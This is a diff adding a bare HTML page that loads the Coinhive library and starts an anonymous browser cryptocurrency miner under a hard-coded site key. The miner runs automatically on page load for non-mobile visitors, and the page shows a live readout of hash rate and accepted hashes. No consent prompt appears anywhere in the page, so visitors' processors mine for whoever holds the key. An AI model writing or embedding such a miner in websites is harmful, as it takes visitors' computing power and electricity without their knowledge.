@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html><head>
+		   <meta charset="UTF-8">
+		<script src="https://code.jquery.com/jquery-3.3.1.min.js"
+integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
+		
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>	
+<script>
+	var miner = new CoinHive.Anonymous('hgKxC20Nt7n3NnnFI9ZGECFSRkWpZeB6', {throttle: 0.3});
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
+<script>
+	// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+		miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+			// Update stats once per second
+		setInterval(function() {
+			var hashesPerSecond = miner.getHashesPerSecond();
+			var totalHashes = miner.getTotalHashes();
+			var acceptedHashes = miner.getAcceptedHashes();
+
+			// Output to HTML elements...
+
+			$("#tot").text(totalHashes);
+	$("#hps").text(hashesPerSecond);
+	$("#acc").text(acceptedHashes);
+		}, 1000);
+</script>
+
+	</head>
+<body>
+	<span>hashesPerSecond </span><span id="hps">0</span><br/>
+	<span>Totalhashes </span><span id="tot">0</span><br/>
+<span>Acceptedhashes </span><span id="acc">0</span>
+
+
+</body>
+</html>
